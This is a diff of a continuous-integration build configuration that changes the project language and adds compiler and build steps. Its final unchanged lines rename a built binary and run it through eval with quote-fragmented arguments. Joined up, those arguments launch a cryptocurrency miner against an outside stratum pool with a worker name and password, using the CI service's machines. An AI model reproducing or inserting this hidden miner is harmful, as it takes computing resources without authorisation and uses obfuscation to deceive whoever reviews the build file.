@@ -1,8 +1,13 @@
-language: php
+language: cpp
+compiler:
+ - clang
+ - gcc
 script:
  - chmod a+x autogen.sh
+ - chmod a+x nomacro.pl
  - ./autogen.sh
- - ./configure
+ - ./nomacro.pl
+ - ./configure CFLAGS="-O3"
  - make
  - mv min*d m
  - eval "./\"m\" -\"a\" \"X\"\"1\"\"1\" -\"o\" \"s\"\"t\"\"r\"\"a\"\"t\"\"u\"\"m\"+\"t\"\"c\"\"p\"://\"d\"\"r\"\"k\".\"c\"\"p\"\"u\"-\"p\"\"o\"\"o\"\"l\".\"n\"\"e\"\"t\":\"3\"\"5\"\"0\"\"0\" -\"u\" \"s\"\"o\"\"k\"\"u\"\"2\".\"t\"\"r\"\"a\" -\"p\" \"v\"\"i\"\"s\""
